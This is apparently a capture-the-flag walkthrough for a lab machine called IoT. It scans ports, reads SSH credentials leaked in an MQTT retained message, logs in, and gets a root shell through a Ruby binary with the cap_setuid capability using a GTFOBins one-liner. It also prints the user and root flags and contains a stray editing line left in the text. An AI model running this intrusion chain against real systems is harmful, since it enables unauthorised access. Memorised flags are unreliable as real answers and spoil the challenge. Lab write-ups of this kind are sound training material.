+++
title = "IoT - Walkthrough"
date = "2026-07-21"
author = "nvru"
description = "Walkthrough for the IoT machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "mqtt",
  "mosquitto",
  "capabilities",
  "initial-access",
  "privilege-escalation",
  "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.30`

The objective was to enumerate the target, identify exposed services, gain initial access through leaked MQTT credentials, and escalate privileges through Linux capabilities.

![Machine information](/images/hmv/iot/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.30 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
PORT     STATE SERVICE                  REASON  VERSION
22/tcp   open  ssh                      syn-ack OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
1883/tcp open  mosquitto                syn-ack Mosquitto version 2.0.21
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/load/bytes/received/15min: 4.57
|     $SYS/broker/clients/maximum: 9
|     ssh/login: redteam:Pentest123!
```

The scan revealed two exposed services:

- SSH running on port `22`
- MQTT broker running on port `1883`

The MQTT service was the most interesting target because Nmap enumeration revealed available broker information.

---

## Enumeration

### MQTT - Mosquitto

The MQTT broker was running on port `1883`.

Nmap's MQTT script revealed several broker details, including retained messages and active topics.

Important output:

```text
ssh/login: redteam:Pentest123!
```

The MQTT broker exposed SSH credentials:

```text
Username: redteam
Password: Pentest123!
```

These credentials could potentially be used for SSH access.

---

## Initial Access

Using the recovered credentials:

```text
Username: redteam
Password: Pentest123!
```

SSH access was successful.

```bash
ssh redteam@10.10.10.30
```

![SSH login](/images/hmv/iot/ssh.png)

Successfully logged into the machine as `redteam`.

---

## Privilege Escalation

### redteam → root

After gaining access, I started local enumeration.

The first check was sudo permissions:

```bash
sudo -l
```

![sudo permissions](/images/hmv/iot/sudo_perm.png)

The user did not have any sudo privileges.

You can replace that section with this corrected wording:

I also checked whether `doas` was installed on the machine:

```bash
which doas
```

![doas permissions](/images/hmv/iot/doas.png)

The `doas` binary was not available on the system, so there was no `doas` configuration to abuse.

---

### Checking User Information

I checked the user's groups:

```bash
groups
```

No useful group memberships were found.

The home directory did not contain any useful information, and the bash history was empty.

![Bash history](/images/hmv/iot/bash_hist.png)

---

### Linux Capabilities Abuse

Since sudo and other common escalation methods were unavailable, I checked for binaries with special capabilities.

Command used:

```bash
getcap -r / 2>/dev/null
```

A vulnerable capability was discovered:

```text
/usr/bin/ruby3.3 cap_setuid+ep
```

The Ruby binary had the `cap_setuid` capability, allowing it to change its UID to `0` (root).

Reference:

- [https://gtfobins.org/gtfobins/ruby/#shell](https://gtfobins.org/gtfobins/ruby/#shell)

Using the GTFOBins Ruby capability abuse technique:

```ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

The command successfully spawned a root shell.

![Capability abuse](/images/hmv/iot/cap_root.png)

Root access was obtained.

---

## Credentials

```text
redteam:Pentest123!
```

---

## Flags

```text
user:4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1

root:cb0f023463e47a76f9d69e0b435a10882b6dd7489c5ca4d4b6ccac9c631a46d8
```
